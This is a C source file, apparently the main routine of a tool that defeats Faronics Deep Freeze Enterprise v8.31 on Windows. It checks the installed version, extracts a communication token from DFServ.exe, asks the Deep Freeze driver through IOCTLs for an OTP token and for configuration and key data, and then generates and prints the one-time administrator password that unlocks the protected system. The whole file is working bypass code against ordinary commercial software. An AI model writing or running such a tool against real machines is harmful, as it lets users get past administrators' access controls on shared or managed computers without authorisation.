#include <stdio.h>
#include <stdint.h>
#include <Windows.h>
#include "deepfreeze.h"
#include "dfserv.h"
#include "errors.h"
#include "ioctl.h"
#include "otp.h"
#include "pe.h"
#include "shared.h"
#include "standard.h"

// Also not sure if xorpad
const uint8_t entry_data_xorpad[] = {
	0xF9, 0x70, 0x25, 0x4F, 0x4B, 0x8A, 0x2A, 0x81,
	0x1D, 0x65, 0x02, 0xAD, 0x37, 0x21, 0x83, 0x48,
	0xF4, 0x13, 0xFA, 0x4D, 0xA8, 0xC4, 0x56, 0xB5,
	0x4F, 0xD6, 0x15, 0x84, 0xE7, 0x3A, 0x32, 0xF9
};

int main(int argc, char *argv[])
{
	int result;
	uint32_t cch, token, otp_token;
	char *edition, otp[64], version[64];

	// printf("OTP-Token: 0x%08X\n", otp_token);

	result = DF_GetVersionString(version, 64);
	switch (result) {
		case ERR_VERSION_INFO:
			//fprintf(stderr, "Error getting version info\n");
			//return 1;
		case ERR_VERSION_QUERY:
			//fprintf(stderr, "Error querying version info\n");
			//return 1;
			fprintf(stderr, "Deep Freeze driver not found, are you sure it's installed?\n");
			return 1;
	}

	edition = DF_IsEnterprise() ? "Enterprise" : "Standard";
	printf("Detected DeepFreeze %s version %s\n", edition, version);

	// For now, only Enterprise v8.31 is supported
	if (!DF_IsEnterprise() || memcmp(version, "8.31.", 5) != 0) {
		fprintf(stderr, "Unsupported DeepFreeze version\n");
		return 1;
	}

	if (!DFS_ExtractToken(&token)) {
		fprintf(stderr, "Unable to extract token from DFServ.exe\n");
		return 1;
	}

	if (!OTP_RequestToken(&otp_token)) {
		fprintf(stderr, "Driver request for OTP Token failed\n");
		return 1;
	}

	// printf("Extracted token for driver comm: %08x\n", token);

	result = OTP_RequestCCH(&cch, token);
	switch (result) {
		case ERR_OPEN_VOLUME:
			fprintf(stderr, "Unable to open volume\n");
			return 1;
		case ERR_IOCTL_GET_CONFIG_SIZE:
			fprintf(stderr, "Unable to get config + key data size from driver\n");
			return 1;
		case ERR_IOCTL_BUFFER_SIZE:
			fprintf(stderr, "Buffer size returned by the driver was bad\n");
			return 1;
		case ERR_MALLOC:
			fprintf(stderr, "Unable to allocate memory for data buffer\n");
			return 1;
		case ERR_IOCTL_GET_CONFIG:
			fprintf(stderr, "Unable to get config + key data from driver\n");
			return 1;
	}

	// printf("Retrieved CCH from driver: %08x\n", cch);

	OTP_Generate(otp, 64, cch, otp_token);
	printf("One-time Password: %s\n", otp);

	return 0;
}
